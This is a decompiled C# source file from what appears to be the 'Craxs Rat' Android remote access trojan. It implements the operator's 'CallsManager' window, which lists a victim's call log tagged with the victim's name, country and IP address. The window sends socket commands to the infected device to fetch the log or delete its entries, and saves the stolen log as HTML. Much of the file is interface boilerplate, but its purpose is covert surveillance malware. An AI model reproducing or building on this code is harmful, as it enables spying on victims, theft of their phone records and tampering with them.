using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CallsManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	[CompilerGenerated]
	private PictureBox _BoxTitle;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	private bool BoxTitlePaintEventArgsWait;

	internal virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewRowsRemovedEventHandler value2 = DGV0_RowsRemoved;
			DataGridViewRowsAddedEventHandler value3 = DGV0_RowsAdded;
			EventHandler value4 = DGV0_SelectionChanged;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.RowsRemoved -= value2;
				dataGridView.RowsAdded -= value3;
				dataGridView.SelectionChanged -= value4;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.RowsRemoved += value2;
				dataGridView.RowsAdded += value3;
				dataGridView.SelectionChanged += value4;
			}
		}
	}

	[field: AccessedThroughProperty("ctxMenu")]
	internal virtual ContextMenuStrip ctxMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RefreshToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RefreshToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RefreshToolStripMenuItem = value;
			toolStripMenuItem = _RefreshToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DeleteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DeleteToolStripMenuItem = value;
			toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveToolStripMenuItem = value;
			toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveAsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveAsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveAsToolStripMenuItem = value;
			toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("PB")]
	internal virtual ProgressBar PB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox BoxTitle
	{
		[CompilerGenerated]
		get
		{
			return _BoxTitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = BoxTitle_Paint;
			EventHandler value3 = BoxTitle_Resize;
			PictureBox pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint -= value2;
				pictureBox.Resize -= value3;
			}
			_BoxTitle = value;
			pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint += value2;
				pictureBox.Resize += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column6")]
	internal virtual DataGridViewTextBoxColumn Column6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column9")]
	internal virtual DataGridViewTextBoxColumn Column9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column7")]
	internal virtual DataGridViewTextBoxColumn Column7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewTextBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column3")]
	internal virtual DataGridViewImageColumn Column3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public CallsManager()
	{
		base.Load += CallsManager_Load;
		base.Activated += AngelAndroidForm_Activated;
		base.Deactivate += AngelAndroidForm_Deactivate;
		Title = "null";
		BoxTitlePaintEventArgsWait = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.RefreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.PB = new System.Windows.Forms.ProgressBar();
		this.BoxTitle = new System.Windows.Forms.PictureBox();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewImageColumn();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctxMenu.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).BeginInit();
		base.SuspendLayout();
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.Black;
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.Column1, this.Column6, this.Column9, this.Column7, this.Column2, this.Column3);
		this.DGV0.ContextMenuStrip = this.ctxMenu;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.SkyBlue;
		this.DGV0.Location = new System.Drawing.Point(0, 0);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(414, 213);
		this.DGV0.TabIndex = 2;
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.RefreshToolStripMenuItem, this.DeleteToolStripMenuItem, this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem });
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.ShowImageMargin = false;
		this.ctxMenu.Size = new System.Drawing.Size(90, 92);
		this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
		this.RefreshToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
		this.RefreshToolStripMenuItem.Text = "Refresh";
		this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
		this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
		this.DeleteToolStripMenuItem.Text = "Delete";
		this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
		this.SaveToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
		this.SaveToolStripMenuItem.Text = "Save";
		this.SaveToolStripMenuItem.Visible = false;
		this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
		this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(89, 22);
		this.SaveAsToolStripMenuItem.Text = "Save As";
		this.SaveAsToolStripMenuItem.Visible = false;
		this.TOpacity.Interval = 1;
		this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.PB.Location = new System.Drawing.Point(0, 213);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(414, 10);
		this.PB.TabIndex = 6;
		this.BoxTitle.BackColor = System.Drawing.Color.Black;
		this.BoxTitle.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.BoxTitle.ErrorImage = null;
		this.BoxTitle.InitialImage = null;
		this.BoxTitle.Location = new System.Drawing.Point(0, 223);
		this.BoxTitle.Name = "BoxTitle";
		this.BoxTitle.Size = new System.Drawing.Size(414, 18);
		this.BoxTitle.TabIndex = 7;
		this.BoxTitle.TabStop = false;
		this.Column1.HeaderText = "number";
		this.Column1.Name = "Column1";
		this.Column1.Width = 74;
		this.Column6.HeaderText = "name";
		this.Column6.Name = "Column6";
		this.Column6.Width = 61;
		this.Column9.HeaderText = "type";
		this.Column9.Name = "Column9";
		this.Column9.Width = 54;
		this.Column7.HeaderText = "date";
		this.Column7.Name = "Column7";
		this.Column7.Width = 54;
		this.Column2.HeaderText = "duration";
		this.Column2.Name = "Column2";
		this.Column2.Width = 76;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.Column3.FillWeight = 1f;
		this.Column3.HeaderText = "";
		this.Column3.MinimumWidth = 2;
		this.Column3.Name = "Column3";
		this.Column3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
		this.Column3.Width = 2;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(414, 241);
		base.Controls.Add(this.DGV0);
		base.Controls.Add(this.PB);
		base.Controls.Add(this.BoxTitle);
		base.Name = "CallsManager";
		base.Opacity = 0.0;
		this.Text = "CallsManager";
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctxMenu.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).EndInit();
		base.ResumeLayout(false);
	}

	private void SpyStyle()
	{
		BoxTitle.BackColor = SpySettings.DefaultColor_Background;
		foreach (DataGridView item in base.Controls.OfType<DataGridView>())
		{
			item.BackgroundColor = SpySettings.DefaultColor_Background;
			item.BackColor = SpySettings.DefaultColor_Background;
			item.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			item.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground;
			item.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void CallsManager_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\5.ico");
		SpyStyle();
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", TextCompare: false) == 0)
		{
			SaveToolStripMenuItem.Visible = true;
			SaveAsToolStripMenuItem.Visible = true;
		}
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		BoxTitlePaintEventArgsWait = true;
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Tag);
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "del" + Data.SPL_DATA + text,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
					DGV0.Rows.RemoveAt(DGV0.SelectedRows[i].Index);
				}
			}
		}
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DGV0,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"Call Log",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(classClient);
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			reso.SAVEit((Array)a0);
		}, new object[8]
		{
			DGV0,
			tmpFolderUSER,
			"Calls Manager",
			tmpClientName,
			tmpCountry + " - " + tmpAddressIP,
			"Call Log",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (BoxTitlePaintEventArgsWait)
			{
				int count = DGV0.Rows.Count;
				string text = "All " + Conversions.ToString(count);
				string text2 = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, defaultColor_Foreground.R, defaultColor_Foreground.G, defaultColor_Foreground.B)), 0, 1, BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
				Rectangle rect = new Rectangle(0, 2, BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (BoxTitle.Height != size2.Height + 3)
				{
					BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}
}
